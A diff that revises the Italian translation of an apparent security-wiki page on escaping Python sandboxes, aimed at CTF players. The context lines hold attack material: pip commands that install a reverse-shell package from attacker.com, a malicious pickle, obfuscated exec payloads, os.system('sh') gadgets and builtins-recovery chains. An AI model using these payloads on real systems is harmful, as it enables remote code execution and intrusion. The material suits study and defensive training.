@@ -52,8 +52,8 @@ Python cerca di **caricare le librerie dalla directory corrente per prima** (il 
 ### Pacchetti di default
 
 Puoi trovare un **elenco dei pacchetti pre-installati** qui: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-Nota che da un pickle puoi far sì che l'ambiente python **importi librerie arbitrarie** installate nel sistema.\
-Ad esempio, il seguente pickle, quando caricato, importerà la libreria pip per utilizzarla:
+Nota che da un pickle puoi fare in modo che l'ambiente python **importi librerie arbitrarie** installate nel sistema.\
+Ad esempio, il seguente pickle, quando caricato, importerà la libreria pip per usarla:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -77,13 +77,13 @@ Se hai accesso a `pip` o `pip.main()`, puoi installare un pacchetto arbitrario e
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Puoi scaricare il pacchetto per creare la reverse shell qui. Si prega di notare che prima di utilizzarlo dovresti **decomprimerlo, modificare il `setup.py` e inserire il tuo IP per la reverse shell**:
+Puoi scaricare il pacchetto per creare la reverse shell qui. Si prega di notare che prima di utilizzarlo è necessario **decomprimerlo, modificare il `setup.py` e inserire il tuo IP per la reverse shell**:
 
 {{#file}}
 Reverse.tar (1).gz
 {{#endfile}}
 
-> [!NOTE]
+> [!TIP]
 > Questo pacchetto si chiama `Reverse`. Tuttavia, è stato appositamente creato in modo che quando esci dalla reverse shell il resto dell'installazione fallisca, quindi **non lascerai alcun pacchetto python extra installato sul server** quando te ne vai.
 
 ## Eval-ing python code
@@ -112,7 +112,7 @@ exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x
 exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
-### Altre librerie che consentono di valutare codice python
+### Altre librerie che consentono di valutare il codice python
 ```python
 #Pandas
 import pandas as pd
@@ -137,7 +137,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 ## Bypassare le protezioni attraverso le codifiche (UTF-7)
 
-In [**questo articolo**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 viene utilizzato per caricare ed eseguire codice python arbitrario all'interno di un apparente sandbox:
+In [**questo writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 viene utilizzato per caricare ed eseguire codice python arbitrario all'interno di un apparente sandbox:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -232,7 +232,7 @@ __iand__ (k = 'import os; os.system("sh")')
 __ior__ (k |= 'import os; os.system("sh")')
 __ixor__ (k ^= 'import os; os.system("sh")')
 ```
-#### Creare oggetti con [metaclassi](https://docs.python.org/3/reference/datamodel.html#metaclasses)
+#### Creazione di oggetti con [metaclassi](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
 La cosa fondamentale che le metaclassi ci permettono di fare è **creare un'istanza di una classe, senza chiamare direttamente il costruttore**, creando una nuova classe con la classe target come metaclasse.
 ```python
@@ -314,10 +314,10 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### No Builtins
 
-Quando non hai `__builtins__` non sarai in grado di importare nulla né di leggere o scrivere file poiché **tutte le funzioni globali** (come `open`, `import`, `print`...) **non sono caricate**.\
+Quando non hai `__builtins__`, non sarai in grado di importare nulla né di leggere o scrivere file poiché **tutte le funzioni globali** (come `open`, `import`, `print`...) **non sono caricate**.\
 Tuttavia, **per impostazione predefinita, python importa molti moduli in memoria**. Questi moduli possono sembrare benigni, ma alcuni di essi **importano anche funzionalità pericolose** al loro interno che possono essere accessibili per ottenere anche **l'esecuzione di codice arbitrario**.
 
-Negli esempi seguenti puoi osservare come **abusare** di alcuni di questi moduli "**benigni**" caricati per **accedere** a **funzionalità** **pericolose** al loro interno.
+Nei seguenti esempi puoi osservare come **abuse** di alcuni di questi moduli "**benigni**" caricati per **accedere** a **funzionalità** **pericolose** al loro interno.
 
 **Python2**
 ```python
@@ -538,7 +538,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Ricerca Ricorsiva di Builtins, Globals...
 
 > [!WARNING]
-> Questo è semplicemente **fantastico**. Se stai **cercando un oggetto come globals, builtins, open o qualsiasi altra cosa** usa semplicemente questo script per **trovare ricorsivamente i luoghi in cui puoi trovare quell'oggetto.**
+> Questo è semplicemente **fantastico**. Se stai **cercando un oggetto come globals, builtins, open o qualsiasi altra cosa**, usa questo script per **trovare ricorsivamente i luoghi in cui puoi trovare quell'oggetto.**
 ```python
 import os, sys # Import these to find more gadgets
 
@@ -707,6 +707,7 @@ return 'HAL 9000'
 > [!CAUTION]
 > Controlla anche la seguente pagina per gadget che r**ead sensitive information from Python internal objects**:
 
+
 {{#ref}}
 ../python-internal-read-gadgets.md
 {{#endref}}
@@ -770,9 +771,9 @@ Questo gadget consente di **caricare una libreria dal disco**. Pertanto, è nece
 ```
 La sfida sfrutta in realtà un'altra vulnerabilità nel server che consente di creare file arbitrari nel disco dei server.
 
-## Dissezionare gli Oggetti Python
+## Dissezione degli oggetti Python
 
-> [!NOTE]
+> [!TIP]
 > Se vuoi **imparare** a conoscere **il bytecode di python** in profondità, leggi questo **fantastico** post sull'argomento: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
 In alcuni CTF potresti ricevere il nome di una **funzione personalizzata in cui risiede il flag** e devi esaminare gli **interni** della **funzione** per estrarlo.
@@ -898,7 +899,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Nota che **se non puoi importare `dis` nella sandbox python** puoi ottenere il **bytecode** della funzione (`get_flag.func_code.co_code`) e **disassemblarlo** localmente. Non vedrai il contenuto delle variabili che vengono caricate (`LOAD_CONST`), ma puoi indovinarle da (`get_flag.func_code.co_consts`) perché `LOAD_CONST` indica anche l'offset della variabile che viene caricata.
+Nota che **se non puoi importare `dis` nel sandbox python** puoi ottenere il **bytecode** della funzione (`get_flag.func_code.co_code`) e **disassemblarlo** localmente. Non vedrai il contenuto delle variabili che vengono caricate (`LOAD_CONST`), ma puoi indovinarle da (`get_flag.func_code.co_consts`) perché `LOAD_CONST` indica anche l'offset della variabile che viene caricata.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -957,19 +958,19 @@ mydict = {}
 mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
-> [!NOTE]
+> [!TIP]
 > A seconda della versione di python, i **parametri** di `code_type` possono avere un **ordine diverso**. Il modo migliore per conoscere l'ordine dei parametri nella versione di python che stai eseguendo è eseguire:
 >
 > ```
 > import types
 > types.CodeType.__doc__
-> 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
+> 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCrea un oggetto codice.  Non per i deboli di cuore.'
 > ```
 
-### Ricreare una funzione leakata
+### Ricreare una funzione trapelata
 
 > [!WARNING]
-> Nell'esempio seguente, prenderemo tutti i dati necessari per ricreare la funzione direttamente dall'oggetto codice della funzione. In un **esempio reale**, tutti i **valori** per eseguire la funzione **`code_type`** è ciò che **dovrai leakare**.
+> Nell'esempio seguente, prenderemo tutti i dati necessari per ricreare la funzione direttamente dall'oggetto codice della funzione. In un **esempio reale**, tutti i **valori** per eseguire la funzione **`code_type`** è ciò che **dovrai trapelare**.
 ```python
 fc = get_flag.__code__
 # In a real situation the values like fc.co_argcount are the ones you need to leak
@@ -982,7 +983,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-In previous examples at the beginning of this post, you can see **come eseguire qualsiasi codice python utilizzando la funzione `compile`**. Questo è interessante perché puoi **eseguire interi script** con cicli e tutto in un **un'unica riga** (e potremmo fare lo stesso usando **`exec`**).\
+In previous examples at the beginning of this post, you can see **come eseguire qualsiasi codice python utilizzando la funzione `compile`**. Questo è interessante perché puoi **eseguire interi script** con cicli e tutto in un **unico comando** (e potremmo fare lo stesso usando **`exec`**).\
 Comunque, a volte potrebbe essere utile **creare** un **oggetto compilato** su una macchina locale ed eseguirlo sulla **macchina CTF** (ad esempio perché non abbiamo la funzione `compiled` nel CTF).
 
 Per esempio, compiliamo ed eseguiamo manualmente una funzione che legge _./poc.py_:
@@ -1020,11 +1021,12 @@ ctype = type((lambda: None).func_code)
 f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
 f(42)
 ```
-## Decompilare Python Compilato
+## Decompilazione di Python Compilato
 
-Utilizzando strumenti come [**https://www.decompiler.com/**](https://www.decompiler.com) è possibile **decompilare** un dato codice python compilato.
+Utilizzando strumenti come [**https://www.decompiler.com/**](https://www.decompiler.com) è possibile **decompilare** il codice python compilato fornito.
 
 **Dai un'occhiata a questo tutorial**:
+
 
 {{#ref}}
 ../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md
